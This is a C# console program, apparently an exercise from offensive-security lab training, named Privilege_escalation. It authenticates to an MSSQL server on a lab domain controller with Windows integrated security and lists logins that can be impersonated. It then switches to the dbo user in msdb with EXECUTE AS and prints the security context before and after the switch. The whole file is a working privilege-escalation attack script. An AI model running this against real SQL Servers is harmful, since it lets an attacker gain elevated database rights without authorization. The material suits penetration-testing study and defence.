using System;
using System.Data.SqlClient;

namespace Privilege_escalation
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success");
            }
            catch
            {
                Console.WriteLine("Auth Failed");
                Environment.Exit(0);
            }

            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("Logins can be impersonated : " + reader[0]);
            }
            reader.Close();

            Console.WriteLine("Before impersonation");

            String querycontext = "SELECT USER_NAME()";
            command = new SqlCommand(querycontext, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of " + reader[0]);

            reader.Close();

            Console.WriteLine("After impersonation");

            querycontext = "use msdb; EXECUTE AS USER = 'dbo'; SELECT USER_NAME();";
            command = new SqlCommand(querycontext, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}